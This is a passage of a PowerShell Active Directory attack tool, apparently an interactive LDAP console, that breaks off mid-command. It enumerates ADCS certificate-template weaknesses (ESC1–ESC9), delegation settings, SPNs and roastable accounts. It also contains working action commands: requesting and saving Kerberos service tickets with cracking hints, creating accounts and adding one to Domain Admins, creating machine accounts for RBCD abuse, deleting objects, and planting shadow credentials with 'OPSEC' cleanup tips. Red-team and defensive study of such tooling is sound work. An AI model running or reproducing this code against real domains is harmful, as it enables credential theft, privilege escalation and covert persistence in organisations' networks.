                                        Write-Host "    $caHost\$caName" -ForegroundColor Green
                                        $published = $true
                                    }
                                }
                            }
                        }
                        if (-not $published) {
                            Write-Host "    (not published on any CA)" -ForegroundColor Yellow
                        }

                        # ESC verdict
                        Write-Host ""
                        Write-Host "  --- ESC Analysis ---" -ForegroundColor Cyan
                        $authEKUs = @('1.3.6.1.5.5.7.3.2','1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.2.3.4','2.5.29.37.0')
                        $hasAuthEKU = ($ekus.Count -eq 0) -or ($ekus | Where-Object { $_ -in $authEKUs })
                        $hasAnyOrNone = ($ekus.Count -eq 0) -or ($ekus -contains '2.5.29.37.0')
                        $hasAgentEKU = $ekus -contains '1.3.6.1.4.1.311.20.2.1'
                        $lowPriv = @('S-1-5-11', 'S-1-1-0')  # Authenticated Users, Everyone
                        $lowPrivNames = @('Authenticated Users', 'Domain Users', 'Domain Computers', 'Everyone')
                        $lowPrivCanEnroll = ($enrollers + $fullControl) | Where-Object {
                            $e = $_
                            $lowPrivNames | Where-Object { $e -match $_ }
                        }

                        if ($supplySAN -and $hasAuthEKU -and -not $reqApproval -and ($raSig -le 0) -and $lowPrivCanEnroll) {
                            Write-Host "    [!] ESC1 - ENROLLEE_SUPPLIES_SUBJECT + Auth EKU + low-priv enrollment" -ForegroundColor Red
                        }
                        if ($hasAnyOrNone -and -not $reqApproval -and ($raSig -le 0)) {
                            Write-Host "    [!] ESC2 - Any Purpose / No EKU" -ForegroundColor Yellow
                        }
                        if ($hasAgentEKU -and -not $reqApproval -and ($raSig -le 0)) {
                            Write-Host "    [!] ESC3 - Certificate Request Agent EKU" -ForegroundColor Yellow
                        }
                        if ($dangerousWrite.Count -gt 0 -and $lowPrivCanEnroll) {
                            Write-Host "    [!] ESC4 - Low-priv has WriteDACL/WriteOwner on template" -ForegroundColor Red
                        }
                        if ($noSecExt -and $hasAuthEKU) {
                            Write-Host "    [!] ESC9 - CT_FLAG_NO_SECURITY_EXTENSION + Auth EKU" -ForegroundColor Yellow
                        }

                        $verdictClean = $true
                        if (-not ($supplySAN -and $hasAuthEKU -and -not $reqApproval) -and
                            -not $hasAnyOrNone -and -not $hasAgentEKU -and
                            $dangerousWrite.Count -eq 0 -and -not $noSecExt) {
                            Write-Host "    [+] No obvious ESC conditions" -ForegroundColor Green
                        }
                    } catch { Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'dn' {
                    if (-not $arg) { Write-Host "  Usage: dn <distinguishedName>" -ForegroundColor Yellow; continue }
                    $searchBase = $arg
                    $searchScope = "Base"
                    $searchFilter = "(objectClass=*)"
                    $searchAttrs = @("*")
                    $searchLimit = 1
                }

                'computers' {
                    $searchFilter = "(objectCategory=computer)"
                    $searchAttrs = @("cn", "distinguishedName", "dNSHostName", "operatingSystem", "operatingSystemVersion", "lastLogonTimestamp")
                    $searchLimit = 200
                }
                'users' {
                    $searchFilter = "(&(objectCategory=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "userPrincipalName", "adminCount", "lastLogonTimestamp")
                    $searchLimit = 200
                }
                'groups' {
                    $searchFilter = "(objectCategory=group)"
                    $searchAttrs = @("cn", "distinguishedName", "description", "groupType", "adminCount")
                    $searchLimit = 200
                }
                'lockout' {
                    $searchFilter = "(&(objectCategory=user)(lockoutTime>=1))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "lockoutTime", "badPwdCount")
                }
                'adminsd' {
                    $searchFilter = "(&(adminCount=1)(objectCategory=user))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "userPrincipalName", "memberOf")
                }
                'sql' {
                    $searchFilter = "(&(objectCategory=user)(servicePrincipalName=MSSQLSvc/*))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "servicePrincipalName", "adminCount")
                }
                'web' {
                    $searchFilter = "(servicePrincipalName=HTTP/*)"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "servicePrincipalName", "objectClass")
                }
                'exchange' {
                    $searchFilter = "(|(cn=Organization Management)(cn=Exchange Servers)(cn=Exchange Trusted Subsystem)(cn=Exchange Windows Permissions))"
                    $searchAttrs = @("cn", "distinguishedName", "member")
                    $showMembers = $true
                }
                'foreigners' {
                    $searchBase = "CN=ForeignSecurityPrincipals,$($ctx.DomainDN)"
                    $searchFilter = "(objectClass=foreignSecurityPrincipal)"
                    $searchAttrs = @("cn", "distinguishedName", "objectSid")
                }
                'sites' {
                    $searchBase = "CN=Sites,$($ctx.ConfigNC)"
                    $searchFilter = "(objectClass=site)"
                    $searchAttrs = @("cn", "distinguishedName", "description", "location")
                }
                'domaininfo' {
                    try {
                        $diReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN, "(objectClass=domain)", "Base",
                            @("distinguishedName", "dc", "objectSid",
                              "ms-DS-MachineAccountQuota", "minPwdLength", "maxPwdAge",
                              "pwdHistoryLength", "lockoutThreshold",
                              "msDS-Behavior-Version", "whenCreated")
                        )
                        $diResp = $ldap.SendRequest($diReq)
                        if ($diResp.Entries.Count -gt 0) {
                            $d = $diResp.Entries[0]
                            Write-Host "  [+] Domain Information:" -ForegroundColor Cyan
                            Write-Host "      DN            : $($d.DistinguishedName)" -ForegroundColor Gray
                            $funcLevel = if ($d.Attributes["msDS-Behavior-Version"]) {
                                switch ([int]$d.Attributes["msDS-Behavior-Version"][0]) {
                                    0 { "Windows 2000" } 1 { "Windows 2003 Interim" }
                                    2 { "Windows 2003" } 3 { "Windows 2008" }
                                    4 { "Windows 2008 R2" } 5 { "Windows 2012" }
                                    6 { "Windows 2012 R2" } 7 { "Windows 2016" }
                                    default { $d.Attributes["msDS-Behavior-Version"][0] }
                                }
                            } else { "(unknown)" }
                            Write-Host "      Functional Lv : $funcLevel" -ForegroundColor Gray
                            foreach ($a in @("ms-DS-MachineAccountQuota", "minPwdLength", "maxPwdAge",
                                            "pwdHistoryLength", "lockoutThreshold", "whenCreated")) {
                                $v = if ($d.Attributes[$a]) { $d.Attributes[$a][0] } else { "(not set)" }
                                Write-Host "      $a : $v" -ForegroundColor Gray
                            }
                            # Domain SID
                            if ($d.Attributes["objectSid"]) {
                                $domSid = New-Object System.Security.Principal.SecurityIdentifier($d.Attributes["objectSid"][0], 0)
                                Write-Host "      Domain SID    : $domSid" -ForegroundColor Cyan
                            }
                        }
                    } catch { Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'lastlogon' {
                    if (-not $arg) { Write-Host "  Usage: lastlogon <sAMAccountName>" -ForegroundColor Yellow; continue }
                    try {
                        $llReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN, "(sAMAccountName=$arg)", "Subtree",
                            @("sAMAccountName", "lastLogonTimestamp", "lastLogon", "pwdLastSet",
                              "badPasswordTime", "badPwdCount", "logonCount", "whenCreated", "whenChanged")
                        )
                        $llReq.SizeLimit = 1
                        $llResp = $ldap.SendRequest($llReq)
                        if ($llResp.Entries.Count -eq 0) { Write-Host "  [-] Not found: $arg" -ForegroundColor Red; continue }
                        $e = $llResp.Entries[0]
                        Write-Host "  [+] Logon Info for $arg :" -ForegroundColor Cyan
                        foreach ($a in @("lastLogonTimestamp", "lastLogon", "pwdLastSet", "badPasswordTime")) {
                            $v = if ($e.Attributes[$a]) {
                                $ft = [long]$e.Attributes[$a][0]
                                if ($ft -le 0) { "Never" }
                                else { try { [DateTime]::FromFileTimeUtc($ft).ToString("yyyy-MM-dd HH:mm:ss UTC") } catch { $ft } }
                            } else { "(not set)" }
                            Write-Host "      $a : $v" -ForegroundColor Gray
                        }
                        foreach ($a in @("badPwdCount", "logonCount", "whenCreated", "whenChanged")) {
                            $v = if ($e.Attributes[$a]) { $e.Attributes[$a][0] } else { "(not set)" }
                            Write-Host "      $a : $v" -ForegroundColor Gray
                        }
                    } catch { Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'kerberoast' {
                    if (-not $arg) {
                        # List all kerberoastable accounts
                        $searchFilter = "(&(objectCategory=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
                        $searchAttrs = @("sAMAccountName", "distinguishedName", "servicePrincipalName", "adminCount", "memberOf")
                    } else {
                        # Request TGS for specific SPN via .NET
                        try {
                            Add-Type -AssemblyName System.IdentityModel
                            Write-Host "  [>] Requesting TGS for: $arg" -ForegroundColor Gray
                            $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $arg
                            $ticketBytes = $ticket.GetRequest()
                            # Extract the AP-REQ from the GSS-API wrapper
                            Write-Host "  [+] TGS received ($($ticketBytes.Length) bytes)" -ForegroundColor Green
                            $b64 = [Convert]::ToBase64String($ticketBytes)
                            $outFile = "$env:TEMP\tgs-$($arg -replace '[/:\\]','_').kirbi"
                            [System.IO.File]::WriteAllBytes($outFile, $ticketBytes)
                            Write-Host "  [+] Saved: $outFile" -ForegroundColor Cyan
                            Write-Host "  [i] Base64 (first 100): $($b64.Substring(0, [Math]::Min(100, $b64.Length)))..." -ForegroundColor Gray
                            Write-Host "  [i] Crack with: hashcat -m 13100 or john --format=krb5tgs" -ForegroundColor Gray
                        } catch {
                            Write-Host "  [-] TGS request failed: $($_.Exception.Message)" -ForegroundColor Red
                        }
                        continue
                    }
                }
                'asreproast' {
                    if (-not $arg) {
                        $searchFilter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
                        $searchAttrs = @("sAMAccountName", "distinguishedName", "userPrincipalName")
                    } else {
                        # Build raw AS-REQ without pre-auth
                        try {
                            Write-Host "  [>] Building AS-REQ (no pre-auth) for: $arg" -ForegroundColor Gray
                            $domain = $ctx.Domain.ToUpper()
                            # Use .NET Kerberos interop to get AS-REP
                            Add-Type -AssemblyName System.IdentityModel
                            # Try requesting with the user's SPN-style name
                            $upn = if ($arg -match '@') { $arg } else { "$arg@$domain" }
                            Write-Host "  [i] Target UPN: $upn" -ForegroundColor Gray
                            Write-Host "  [i] AS-REP roast targets found via 'asreproast' (no arg)" -ForegroundColor Yellow
                            Write-Host "  [i] Use Rubeus: Rubeus.exe asreproast /user:$arg /nowrap" -ForegroundColor Gray
                            Write-Host "  [i] Use GetNPUsers: GetNPUsers.py $($ctx.Domain)/$arg -no-pass -dc-ip <DC>" -ForegroundColor Gray
                        } catch {
                            Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red
                        }
                        continue
                    }
                }
                'delegations' {
                    try {
                        Write-Host "  [+] --- Unconstrained Delegation ---" -ForegroundColor Cyan
                        $udReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN,
                            "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))",
                            "Subtree",
                            @("cn", "distinguishedName", "dNSHostName")
                        )
                        $udReq.SizeLimit = 50
                        $udResp = $ldap.SendRequest($udReq)
                        foreach ($e in $udResp.Entries) {
                            $cn = if ($e.Attributes["cn"]) { $e.Attributes["cn"][0] } else { "" }
                            Write-Host "    UNCONSTRAINED: $cn ($($e.DistinguishedName))" -ForegroundColor Yellow
                        }
                        if ($udResp.Entries.Count -eq 0) { Write-Host "    (none)" -ForegroundColor DarkGray }

                        Write-Host "  [+] --- Constrained Delegation ---" -ForegroundColor Cyan
                        $cdReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN,
                            "(msDS-AllowedToDelegateTo=*)",
                            "Subtree",
                            @("sAMAccountName", "distinguishedName", "msDS-AllowedToDelegateTo", "userAccountControl")
                        )
                        $cdReq.SizeLimit = 50
                        $cdResp = $ldap.SendRequest($cdReq)
                        foreach ($e in $cdResp.Entries) {
                            $sam = if ($e.Attributes["sAMAccountName"]) { $e.Attributes["sAMAccountName"][0] } else { "" }
                            $targets = @()
                            if ($e.Attributes["msDS-AllowedToDelegateTo"]) {
                                for ($i = 0; $i -lt $e.Attributes["msDS-AllowedToDelegateTo"].Count; $i++) {
                                    $targets += $e.Attributes["msDS-AllowedToDelegateTo"][$i]
                                }
                            }
                            Write-Host "    CONSTRAINED: $sam -> $($targets -join ', ')" -ForegroundColor Yellow
                        }
                        if ($cdResp.Entries.Count -eq 0) { Write-Host "    (none)" -ForegroundColor DarkGray }

                        Write-Host "  [+] --- Resource-Based Constrained Delegation ---" -ForegroundColor Cyan
                        $rbcdReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN,
                            "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
                            "Subtree",
                            @("cn", "distinguishedName", "msDS-AllowedToActOnBehalfOfOtherIdentity")
                        )
                        $rbcdReq.SizeLimit = 50
                        $rbcdResp = $ldap.SendRequest($rbcdReq)
                        foreach ($e in $rbcdResp.Entries) {
                            $cn = if ($e.Attributes["cn"]) { $e.Attributes["cn"][0] } else { "" }
                            Write-Host "    RBCD on: $cn" -ForegroundColor Yellow
                            if ($e.Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"]) {
                                try {
                                    $sdBytes = $e.Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"][0]
                                    $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($sdBytes, 0)
                                    foreach ($ace in $sd.DiscretionaryAcl) {
                                        $sidStr = $ace.SecurityIdentifier.Value
                                        try {
                                            $ntAcc = $ace.SecurityIdentifier.Translate([System.Security.Principal.NTAccount])
                                            Write-Host "      <- $ntAcc ($sidStr)" -ForegroundColor Gray
                                        } catch {
                                            Write-Host "      <- $sidStr" -ForegroundColor Gray
                                        }
                                    }
                                } catch {}
                            }
                        }
                        if ($rbcdResp.Entries.Count -eq 0) { Write-Host "    (none)" -ForegroundColor DarkGray }
                    } catch { Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'servicemap' {
                    try {
                        $smReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN,
                            "(servicePrincipalName=*)",
                            "Subtree",
                            @("sAMAccountName", "servicePrincipalName", "objectClass")
                        )
                        $smReq.SizeLimit = 500
                        $smResp = $ldap.SendRequest($smReq)
                        $svcTypes = @{}
                        foreach ($e in $smResp.Entries) {
                            if ($e.Attributes["servicePrincipalName"]) {
                                for ($i = 0; $i -lt $e.Attributes["servicePrincipalName"].Count; $i++) {
                                    $spn = $e.Attributes["servicePrincipalName"][$i]
                                    $svcType = ($spn -split '/')[0]
                                    if (-not $svcTypes.ContainsKey($svcType)) { $svcTypes[$svcType] = 0 }
                                    $svcTypes[$svcType]++
                                }
                            }
                        }
                        Write-Host "  [+] SPN Service Map ($($smResp.Entries.Count) objects):" -ForegroundColor Cyan
                        $svcTypes.GetEnumerator() | Sort-Object -Property Value -Descending | ForEach-Object {
                            $svc = $_.Key
                            $hint = switch ($svc) {
                                'MSSQLSvc' { 'SQL Server' } 'HTTP' { 'Web/IIS' }
                                'TERMSRV' { 'RDP' } 'WSMAN' { 'WinRM' }
                                'exchangeMDB' { 'Exchange' } 'ldap' { 'LDAP/DC' }
                                'DNS' { 'DNS' } 'GC' { 'Global Catalog' }
                                'HOST' { 'Host' } 'RestrictedKrbHost' { 'Kerberos' }
                                'CIFS' { 'SMB/CIFS' } 'FTP' { 'FTP' }
                                'SMTP' { 'SMTP' } 'IMAP' { 'IMAP' }
                                default { '' }
                            }
                            $label = if ($hint) { "$svc ($hint)" } else { $svc }
                            Write-Host "      $label : $($_.Value)" -ForegroundColor Gray
                        }
                    } catch { Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'gpolinks' {
                    try {
                        $glReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $ctx.DomainDN,
                            "(gPLink=*)",
                            "Subtree",
                            @("distinguishedName", "gPLink", "ou", "name")
                        )
                        $glReq.SizeLimit = 200
                        $glResp = $ldap.SendRequest($glReq)
                        Write-Host "  [+] GPO Links ($($glResp.Entries.Count) OUs/containers):" -ForegroundColor Cyan
                        foreach ($e in $glResp.Entries) {
                            $dn = $e.DistinguishedName
                            $links = if ($e.Attributes["gPLink"]) { $e.Attributes["gPLink"][0] } else { "" }
                            $shortDN = ($dn -split ',')[0]
                            Write-Host "    $shortDN :" -ForegroundColor White
                            # Parse [LDAP://CN={GUID},CN=Policies,...;status] format
                            $links -split '\]\[' | ForEach-Object {
                                $l = $_ -replace '^\[','' -replace '\]$',''
                                if ($l -match 'LDAP://([^;]+);(\d+)') {
                                    $gpoDN = $Matches[1]
                                    $status = switch ($Matches[2]) { '0' { 'Enabled' } '1' { 'Disabled' } '2' { 'Enforced' } default { $Matches[2] } }
                                    $cn = ($gpoDN -split ',')[0] -replace 'CN=',''
                                    Write-Host "      -> $cn ($status)" -ForegroundColor Gray
                                }
                            }
                        }
                    } catch { Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'dnszones' {
                    $searchBase = "CN=MicrosoftDNS,DC=DomainDnsZones,$($ctx.DomainDN)"
                    $searchFilter = "(objectClass=dnsZone)"
                    $searchAttrs = @("dc", "distinguishedName", "dnsProperty")
                    $searchLimit = 50
                }
                'dnsrecords' {
                    if (-not $arg) { Write-Host "  Usage: dnsrecords <zoneName>" -ForegroundColor Yellow; continue }
                    $searchBase = "DC=$arg,CN=MicrosoftDNS,DC=DomainDnsZones,$($ctx.DomainDN)"
                    $searchFilter = "(objectClass=dnsNode)"
                    $searchAttrs = @("dc", "distinguishedName", "dnsRecord")
                    $searchLimit = 200
                }
                'sccm' {
                    $searchFilter = "(|(servicePrincipalName=SMS*)(servicePrincipalName=SCCMServer*)(cn=*SCCM*)(cn=*SMS*)(cn=*MECM*))"
                    $searchAttrs = @("sAMAccountName", "distinguishedName", "servicePrincipalName", "objectClass", "operatingSystem")
                }
                'rodc' {
                    $searchFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))"
                    $searchAttrs = @("cn", "distinguishedName", "dNSHostName", "operatingSystem", "managedBy", "msDS-RevealOnDemandGroup", "msDS-NeverRevealGroup")
                }
                'acl' {
                    if (-not $arg) { Write-Host "  Usage: acl <DN or sAMAccountName> <identity>" -ForegroundColor Yellow; continue }
                    $aclParts = $arg -split '\s+', 2
                    $aclDN = Resolve-LdapDN $aclParts[0]
                    if (-not $aclDN) { Write-Host "  [-] Not found: $($aclParts[0])" -ForegroundColor Red; continue }
                    $aclIdentity = if ($aclParts.Count -gt 1) { $aclParts[1] } else { "" }
                    try {
                        $sd = Get-LdapSD $aclDN
                        if (-not $sd) { Write-Host "  [-] Cannot read SD" -ForegroundColor Red; continue }
                        Write-Host "  [+] ACL on: $aclDN" -ForegroundColor Cyan
                        foreach ($ace in $sd.DiscretionaryAcl) {
                            $sidStr = $ace.SecurityIdentifier.Value
                            $ntName = try { $ace.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value } catch { $sidStr }
                            if ($aclIdentity -and $ntName -notmatch [regex]::Escape($aclIdentity) -and $sidStr -ne $aclIdentity) { continue }
                            $aceType = if ($ace.AceType -match 'Allow') { 'ALLOW' } else { 'DENY' }
                            $rights = Format-ADRights $ace.AccessMask
                            $objInfo = ''
                            if ($ace -is [System.Security.AccessControl.ObjectAce]) {
                                $og = $ace.ObjectAceType
                                if ($og -ne [guid]::Empty) {
                                    $known = $guidMap.GetEnumerator() | Where-Object { $_.Value -eq $og.ToString() } | Select-Object -First 1
                                    $objInfo = if ($known) { " [$($known.Key)]" } else { " [$og]" }
                                }
                            }
                            $color = if ($aceType -eq 'ALLOW') { 'Gray' } else { 'Red' }
                            if ($rights -contains 'GenericAll' -or $rights -contains 'WriteDACL' -or
                                $rights -contains 'WriteOwner') { $color = 'Yellow' }
                            Write-Host "    $aceType $ntName : $($rights -join ', ')$objInfo" -ForegroundColor $color
                        }
                    } catch { Write-Host "  [-] Error: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }

                # ---- ACTION COMMANDS ----
                'adduser' {
                    if (-not $arg) { Write-Host "  Usage: adduser <sAMAccountName> [password]" -ForegroundColor Yellow; continue }
                    $auParts = $arg -split '\s+', 2
                    $auName = $auParts[0]
                    $auPass = if ($auParts.Count -gt 1) { $auParts[1] }
                    else { -join ((48..57) + (65..90) + (97..122) + (33,35,36,37,38,42) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
                    $auDN = "CN=$auName,CN=Users,$($ctx.DomainDN)"
                    Write-Host "  [>] Creating user: $auDN" -ForegroundColor Gray
                    try {
                        $addReq = New-Object System.DirectoryServices.Protocols.AddRequest
                        $addReq.DistinguishedName = $auDN
                        $oc = New-Object System.DirectoryServices.Protocols.DirectoryAttribute("objectClass")
                        $oc.Add("top") | Out-Null; $oc.Add("person") | Out-Null
                        $oc.Add("organizationalPerson") | Out-Null; $oc.Add("user") | Out-Null
                        $addReq.Attributes.Add($oc) | Out-Null
                        $addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("sAMAccountName", $auName))) | Out-Null
                        $addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("userPrincipalName", "$auName@$($ctx.Domain)"))) | Out-Null
                        $addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "544"))) | Out-Null
                        $ldap.SendRequest($addReq) | Out-Null
                        # Set password
                        $auQuoted = [System.Text.Encoding]::Unicode.GetBytes("`"$auPass`"")
                        $pwdMod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                            $auDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                            "unicodePwd", $auQuoted
                        )
                        $ldap.SendRequest($pwdMod) | Out-Null
                        # Enable account (NORMAL_ACCOUNT = 512)
                        $enMod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                            $auDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                            "userAccountControl", "512"
                        )
                        $ldap.SendRequest($enMod) | Out-Null
                        Write-Host "  [+] User created: $auName" -ForegroundColor Green
                        Write-Host "  [+] Password: $auPass" -ForegroundColor Cyan
                        Write-Host "  [i] DN: $auDN" -ForegroundColor Gray
                    } catch {
                        Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                    }
                    continue
                }
                'addda' {
                    if (-not $arg) { Write-Host "  Usage: addda <sAMAccountName> [password]" -ForegroundColor Yellow; continue }
                    $daParts = $arg -split '\s+', 2
                    $daName = $daParts[0]
                    $daPass = if ($daParts.Count -gt 1) { $daParts[1] }
                    else { -join ((48..57) + (65..90) + (97..122) + (33,35,36,37,38,42) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
                    $daDN = "CN=$daName,CN=Users,$($ctx.DomainDN)"
                    Write-Host "  [>] Creating Domain Admin: $daName" -ForegroundColor Yellow
                    try {
                        # Create user
                        $addReq = New-Object System.DirectoryServices.Protocols.AddRequest
                        $addReq.DistinguishedName = $daDN
                        $oc = New-Object System.DirectoryServices.Protocols.DirectoryAttribute("objectClass")
                        $oc.Add("top") | Out-Null; $oc.Add("person") | Out-Null
                        $oc.Add("organizationalPerson") | Out-Null; $oc.Add("user") | Out-Null
                        $addReq.Attributes.Add($oc) | Out-Null
                        $addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("sAMAccountName", $daName))) | Out-Null
                        $addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("userPrincipalName", "$daName@$($ctx.Domain)"))) | Out-Null
                        $addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "544"))) | Out-Null
                        $ldap.SendRequest($addReq) | Out-Null
                        # Set password
                        $daQuoted = [System.Text.Encoding]::Unicode.GetBytes("`"$daPass`"")
                        $pwdMod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                            $daDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                            "unicodePwd", $daQuoted
                        )
                        $ldap.SendRequest($pwdMod) | Out-Null
                        # Enable account
                        $enMod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                            $daDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                            "userAccountControl", "512"
                        )
                        $ldap.SendRequest($enMod) | Out-Null
                        Write-Host "  [+] User created: $daName" -ForegroundColor Green
                        Write-Host "  [+] Password: $daPass" -ForegroundColor Cyan
                    } catch {
                        Write-Host "  [-] User creation failed: $($_.Exception.Message)" -ForegroundColor Red
                        continue
                    }
                    # Add to Domain Admins
                    $daGroupDN = "CN=Domain Admins,CN=Users,$($ctx.DomainDN)"
                    try {
                        $grpMod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                            $daGroupDN,
                            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add,
                            "member", $daDN
                        )
                        $ldap.SendRequest($grpMod) | Out-Null
                        Write-Host "  [+] Added to Domain Admins" -ForegroundColor Green
                        Write-Host "  [i] $daName is now a Domain Admin" -ForegroundColor Cyan
                    } catch {
                        Write-Host "  [-] DA add failed: $($_.Exception.Message)" -ForegroundColor Red
                        Write-Host "  [i] User created but not in DA. Try: addmember `"Domain Admins`" $daName" -ForegroundColor Yellow
                    }
                    continue
                }
                'addcomputer' {
                    if (-not $arg) { Write-Host "  Usage: addcomputer <name> [password]" -ForegroundColor Yellow; continue }
                    $acParts = $arg -split '\s+', 2
                    $acName = $acParts[0] -replace '\$$',''
                    $acPass = if ($acParts.Count -gt 1) { $acParts[1] }
                    else { -join ((48..57) + (65..90) + (97..122) + (33,35,36,37,38,42) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
                    $acSam = "$acName$"
                    $acDN = "CN=$acName,CN=Computers,$($ctx.DomainDN)"
                    Write-Host "  [>] Creating computer: $acSam" -ForegroundColor Gray
                    try {
                        $addReq = New-Object System.DirectoryServices.Protocols.AddRequest
                        $addReq.DistinguishedName = $acDN
                        $oc = New-Object System.DirectoryServices.Protocols.DirectoryAttribute("objectClass")
                        $oc.Add("top") | Out-Null; $oc.Add("person") | Out-Null
                        $oc.Add("organizationalPerson") | Out-Null; $oc.Add("user") | Out-Null
                        $oc.Add("computer") | Out-Null
                        $addReq.Attributes.Add($oc) | Out-Null
                        $addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("sAMAccountName", $acSam))) | Out-Null
                        $addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4096"))) | Out-Null
                        $acQuoted = [System.Text.Encoding]::Unicode.GetBytes("`"$acPass`"")
                        $addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("unicodePwd", $acQuoted))) | Out-Null
                        $ldap.SendRequest($addReq) | Out-Null
                        Write-Host "  [+] Computer created: $acSam" -ForegroundColor Green
                        Write-Host "  [+] Password: $acPass" -ForegroundColor Cyan
                        Write-Host "  [i] DN: $acDN" -ForegroundColor Gray
                        Write-Host "  [i] Use for RBCD: setrbcd <targetDN> $acDN" -ForegroundColor Gray
                    } catch {
                        Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                    }
                    continue
                }
                'deluser' {
                    if (-not $arg) { Write-Host "  Usage: deluser <sAMAccountName or DN>" -ForegroundColor Yellow; continue }
                    $delDN = $arg
                    if ($arg -notmatch ',') {
                        try {
                            $fReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                                $searchBase, "(sAMAccountName=$arg)", "Subtree", @("distinguishedName")
                            )
                            $fReq.SizeLimit = 1
                            $fResp = $ldap.SendRequest($fReq)
                            if ($fResp.Entries.Count -eq 0) { Write-Host "  [-] Not found: $arg" -ForegroundColor Red; continue }
                            $delDN = $fResp.Entries[0].DistinguishedName
                        } catch { Write-Host "  [-] Resolve failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
                    }
                    Write-Host "  [>] Deleting: $delDN" -ForegroundColor Yellow
                    try {
                        $delReq = New-Object System.DirectoryServices.Protocols.DeleteRequest($delDN)
                        $ldap.SendRequest($delReq) | Out-Null
                        Write-Host "  [+] Deleted: $delDN" -ForegroundColor Green
                    } catch {
                        Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                    }
                    continue
                }
                'shadowcred' {
                    if (-not $arg) { Write-Host "  Usage: shadowcred <sAMAccountName or DN>" -ForegroundColor Yellow; continue }
                    $scTarget = $arg
                    $scDN = $scTarget
                    if ($scTarget -notmatch ',') {
                        try {
                            $fReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                                $searchBase, "(sAMAccountName=$scTarget)", "Subtree", @("distinguishedName")
                            )
                            $fReq.SizeLimit = 1
                            $fResp = $ldap.SendRequest($fReq)
                            if ($fResp.Entries.Count -eq 0) { Write-Host "  [-] Not found: $scTarget" -ForegroundColor Red; continue }
                            $scDN = $fResp.Entries[0].DistinguishedName
                            Write-Host "  [i] Resolved: $scDN" -ForegroundColor Gray
                        } catch { Write-Host "  [-] Resolve failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
                    }
                    try {
                        $scResult = New-ShadowCredential -TargetDN $scDN -Connection $ldap -OutDir "$env:TEMP\adcs-ops" -Indent "  "
                        if ($scResult) {
                            Write-Host ""
                            Write-Host "  --- OPSEC: Cleanup After Use ---" -ForegroundColor Yellow
                            Write-Host "  clearcred $scTarget" -ForegroundColor White
                            Write-Host "  .\Invoke-ShadowCredentials.ps1 -Target `"$scTarget`" -Action Remove -DeviceId `"$($scResult.DeviceId)`"" -ForegroundColor White
                        }
                    } catch {
